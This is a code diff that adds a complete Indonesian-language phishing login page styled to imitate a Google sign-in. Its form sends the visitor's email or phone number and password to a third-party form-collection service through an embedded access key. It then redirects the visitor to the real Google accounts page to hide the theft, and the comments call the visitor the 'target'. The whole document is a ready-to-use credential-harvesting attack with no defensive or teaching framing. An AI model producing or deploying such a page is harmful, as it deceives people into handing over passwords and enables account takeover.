@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Masuk</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+       background:#f5f5f7;min-height:100vh;display:flex;align-items:center;
+       justify-content:center;padding:20px}
+  .card{background:#fff;width:100%;max-width:400px;padding:40px 32px;
+        border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,.08)}
+  .logo{width:64px;height:64px;margin:0 auto 24px;
+        background:linear-gradient(135deg,#1a73e8,#4285f4);border-radius:50%;
+        display:flex;align-items:center;justify-content:center;
+        color:#fff;font-size:28px;font-weight:700}
+  h1{font-size:22px;text-align:center;color:#202124;margin-bottom:8px}
+  .subtitle{text-align:center;color:#5f6368;font-size:14px;margin-bottom:32px}
+  label{display:block;font-size:13px;color:#5f6368;margin-bottom:6px;font-weight:500}
+  input{width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:8px;
+        font-size:15px;margin-bottom:18px;outline:none;transition:border .2s}
+  input:focus{border-color:#1a73e8}
+  button{width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;
+         border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;
+         transition:background .2s}
+  button:hover{background:#1765cc}
+  button:disabled{opacity:.7;cursor:not-allowed}
+  .footer{text-align:center;margin-top:24px;font-size:12px;color:#80868b}
+  .footer a{color:#1a73e8;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">L</div>
+  <h1>Masuk</h1>
+  <p class="subtitle">Gunakan akun Anda untuk melanjutkan</p>
+  
+  <form action="https://api.web3forms.com/submit" method="POST">
+    
+    <!-- Kunci Web3Forms udah otomatis masuk di sini -->
+    <input type="hidden" name="access_key" value="27315c66-662d-4dae-83a7-94d9725f63f5">
+    
+    <!-- Honeypot anti-bot, biarin aja -->
+    <input type="checkbox" name="botcheck" style="display:none;">
+    
+    <label for="email">Email atau Nomor Telepon</label>
+    <input type="email" id="email" name="email" placeholder="email@contoh.com" required>
+    
+    <label for="password">Kata Sandi</label>
+    <input type="password" id="password" name="password" placeholder="Masukkan kata sandi" required>
+    
+    <!-- Target bakal di-redirect ke Google setelah login -->
+    <input type="hidden" name="redirect" value="https://accounts.google.com">
+    
+    <button type="submit" id="btn">Masuk</button>
+  </form>
+  
+  <div class="footer">
+    <a href="#">Lupa kata sandi?</a> &nbsp;·&nbsp; <a href="#">Buat akun baru</a>
+  </div>
+</div>
+<script>
+  document.querySelector('form').addEventListener('submit', function(){
+    var btn = document.getElementById('btn');
+    btn.disabled = true;
+    btn.textContent = 'Memeriksa...';
+  });
+</script>
+</body>
+</html>
